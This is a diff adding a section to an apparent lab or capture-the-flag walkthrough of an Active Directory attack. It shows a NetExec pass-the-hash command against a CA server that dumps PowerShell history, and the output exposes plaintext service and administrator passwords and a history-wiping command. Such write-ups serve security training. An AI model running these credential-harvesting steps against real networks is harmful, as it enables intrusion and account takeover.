@@ -420,3 +420,27 @@ Now i should have a session on my c2 client
 
 New administrator session on the CA server
 
+# Administrator on the external Domain Controller
+```python
+nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' -M powershell_history
+SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
+POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+POWERSHE... 10.10.10.134    445    CA                   $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+POWERSHE... 10.10.10.134    445    CA                   $localLog = "C:\Temp\network_health_$timestamp.txt"
+POWERSHE... 10.10.10.134    445    CA                   $ping = Test-Connection -ComputerName $device.IP -Count 2 -Quiet`
+POWERSHE... 10.10.10.134    445    CA                   $tcp22 = Test-NetConnection -ComputerName $device.IP -Port 22 -InformationLevel Quiet`
+POWERSHE... 10.10.10.134    445    CA                   Write-Host "Health check complete. Preparing to upload log..."
+POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /user:ldap_svc 6trfgvb**hs#@jskKFHJAh34
+POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /delete
+POWERSHE... 10.10.10.134    445    CA                   echo "" > C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+POWERSHE... 10.10.10.134    445    CA                   net user "ca_svc_account$" "RTGHs82358sUFU*$%*&#jskj"
+POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+POWERSHE... 10.10.10.134    445    CA                   
+POWERSHE... 10.10.10.134    445    CA                   
+POWERSHE... 10.10.10.134    445    CA                   
+POWERSHE... 10.10.10.134    445    CA               C:\Users\ca_svc_account$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+POWERSHE... 10.10.10.134    445    CA                   net user administrator "ebz0yxy3txh9BDE*yeh"
+```
+Ill use a nxc module to dump the powershell history
+
